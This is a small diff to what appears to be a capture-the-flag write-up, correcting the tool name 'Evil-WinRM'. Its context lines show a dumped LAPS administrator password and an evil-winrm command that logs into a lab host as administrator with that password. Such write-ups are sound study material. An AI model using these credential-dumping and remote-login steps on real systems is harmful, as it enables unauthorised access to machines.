@@ -303,7 +303,7 @@ ms-Mcs-AdmPwd                        : o++qx9z;FhZ%0m0}NtA-n&06
 ...
 {% endhighlight %}
   
-I have now dumped the administrator account clear text password. I was able to login with Wvil-WinRM and root Administrator:
+I have now dumped the administrator account clear text password. I was able to login with Evil-WinRM and root Administrator:
 
 {% highlight bash linenos %}
 evil-winrm -u administrator -p '0;W,wqm3/R&$ZXJ[eC3y8qw#' -i 10.10.11.152 -S
